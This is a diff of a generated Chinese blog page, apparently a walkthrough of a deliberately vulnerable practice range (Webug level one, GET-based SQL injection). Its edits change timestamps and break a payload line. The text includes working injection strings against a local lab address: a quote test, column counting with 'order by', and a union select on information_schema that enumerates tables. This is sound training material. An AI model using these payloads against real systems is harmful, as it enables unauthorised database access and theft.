@@ -111,7 +111,7 @@
 <meta property="og:image" content="https://weiweiyoo.github.io/2019/02/07/Webug渗透教程之普通的GET注入-第一关/6.png">
 <meta property="og:image" content="https://weiweiyoo.github.io/2019/02/07/Webug渗透教程之普通的GET注入-第一关/7.png">
 <meta property="og:image" content="https://weiweiyoo.github.io/2019/02/07/Webug渗透教程之普通的GET注入-第一关/8.png">
-<meta property="og:updated_time" content="2019-02-08T08:28:58.976Z">
+<meta property="og:updated_time" content="2019-02-08T08:33:43.887Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Webug漏洞靶场之普通的GET注入(第一关)">
 <meta name="twitter:description" content="普通的GET注入1. 题目明确是GET注入       链接中给出gid，从这里下手 2. 首先判断是否存在注入点，一般先进行单引号测试       服务器回显错误，判断存在SQL注入漏洞 3. 使用order by语句猜测字段数   playload: http://192.168.247.133/pentest/test/sqli/sqltamp.php?gid=1&amp;#39; order by">
@@ -408,7 +408,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-08 16:28:58" itemprop="dateModified" datetime="2019-02-08T16:28:58+08:00">2019-02-08</time>
+                <time title="修改时间：2019-02-08 16:33:43" itemprop="dateModified" datetime="2019-02-08T16:33:43+08:00">2019-02-08</time>
               
             
           </span>
@@ -465,7 +465,7 @@
 <p>   <img src="5.png" alt="5"></p>
 <p>   得到数据库版本为5.5.53，库名为pentesterlab。</p>
 <h4 id="5-猜表名"><a href="#5-猜表名" class="headerlink" title="5. 猜表名"></a>5. 猜表名</h4><p>   使用information_schema.tables查询pentesterlab中的表名</p>
-<p>   playload: <a href="http://192.168.247.133/pentest/test/sqli/sqltamp.php?gid=1&#39;and" target="_blank" rel="noopener">http://192.168.247.133/pentest/test/sqli/sqltamp.php?gid=1&#39;and</a> 1=2 union select 1,2,table_name,4 from information_schema.tables where table_schema=’pentesterlab’ –+</p>
+<p>   playload: <a href="http://192.168.247.133/pentest/test/sqli/sqltamp.php?gid=1&#39;and" target="_blank" rel="noopener">http://192.168.247.133/pentest/test/sqli/sqltamp.php?gid=1&#39;and</a> 1=2 union select 1,2,<br>   table_name,4 from information_schema.tables where table_schema=’pentesterlab’ –+</p>
 <p>   <img src="6.png" alt="6"></p>
 <p>   发现库中有个表叫flag，作为目标</p>
 <h4 id="6-猜flag表中的列名"><a href="#6-猜flag表中的列名" class="headerlink" title="6. 猜flag表中的列名"></a>6. 猜flag表中的列名</h4><p>   使用group_concat(column_name)查询表flag中所有的列名</p>
